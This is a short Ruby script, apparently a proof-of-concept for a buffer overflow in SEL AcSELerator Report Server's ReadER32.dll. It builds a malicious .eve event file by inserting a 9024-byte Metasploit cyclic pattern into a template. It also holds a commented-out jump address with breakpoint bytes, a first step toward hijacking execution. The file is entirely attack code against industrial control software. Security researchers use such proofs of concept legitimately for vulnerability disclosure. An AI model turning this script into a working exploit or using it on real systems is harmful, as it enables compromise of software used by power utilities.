#!/usr/bin/env ruby
# AcSELerator Report Server (2.41.1.0) contains a
# buffer overflow in SEL Event Waveform (1.04.0003) -> ReadER32.dll (1.7.6.0).
# ... the exploitable code can be reached from the main application by 
# importing a .eve file via: Admin->Databases->Add External Event Report...
require 'rex'

fd = File.open("template.eve", "rb" )
new_eve = fd.read(fd.stat.size)
fd.close

#jmp = [0x1002567a].pack('V') + "\xcc" * 24

data = Rex::Text.pattern_create(9024)
#data[80, jmp.size] = jmp

fuzz = new_eve

x = File.new("fuzz.eve","wb")
x.write(fuzz.gsub(/FUZZER/, data))
x.close
